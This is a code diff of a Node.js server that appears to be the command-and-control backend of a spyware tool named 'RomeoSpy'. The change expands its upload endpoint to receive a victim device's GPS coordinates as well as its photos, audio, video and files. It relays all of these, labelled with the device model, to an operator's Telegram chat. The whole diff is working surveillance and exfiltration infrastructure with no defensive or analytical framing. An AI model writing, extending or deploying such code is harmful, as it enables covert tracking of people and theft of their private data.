@@ -17,18 +17,53 @@ const sessions = new Map(); // chat.id => socketId
 const pending = new Map();  // chat.id => { command, extras }
 
 app.post("/upload", upload.single("file"), (req, res) => {
-  const model = req.headers.model || "Unknown";
-  const file = req.file;
-  if (file) {
-    bot.sendDocument(config.id, file.buffer, {
-      filename: file.originalname,
-      contentType: file.mimetype
-    }, {
-      caption: `📁 File from ${model}`,
-      parse_mode: "HTML"
-    });
-  }
-  res.send("Done");
+  const model = req.headers.model || "Unknown";
+  const file = req.file;
+
+  const latitude = parseFloat(req.headers.latitude);
+  const longitude = parseFloat(req.headers.longitude);
+
+  if (!isNaN(latitude) && !isNaN(longitude)) {
+    bot.sendLocation(config.id, latitude, longitude, {
+      reply_markup: { remove_keyboard: true }
+    });
+    bot.sendMessage(config.id, `📍 Location from ${model}:\nLatitude: ${latitude}\nLongitude: ${longitude}`);
+    return res.send("Location sent");
+  }
+
+  if (file) {
+    const fileOptions = {
+      filename: file.originalname,
+      contentType: file.mimetype
+    };
+
+    const caption = `📁 File from ${model}`;
+
+    if (file.mimetype.startsWith("image/")) {
+      bot.sendPhoto(config.id, file.buffer, {
+        caption: `📷 Photo from ${model}`,
+        parse_mode: "HTML"
+      });
+    } else if (file.mimetype.startsWith("audio/") || file.originalname.endsWith(".mp3")) {
+      bot.sendAudio(config.id, file.buffer, {
+        caption: `🎧 Audio from ${model}`,
+        parse_mode: "HTML"
+      });
+    } else if (file.originalname.endsWith(".mp4")) {
+      bot.sendVideo(config.id, file.buffer, {
+        caption: `🎥 Video from ${model}`,
+        parse_mode: "HTML"
+      });
+    } else {
+      bot.sendDocument(config.id, file.buffer, {
+        ...fileOptions,
+        caption: caption,
+        parse_mode: "HTML"
+      });
+    }
+  }
+
+  res.send("Done");
 });
 
 app.get("/text", (_, res) => res.send(config.text || "RomeoSpy"));
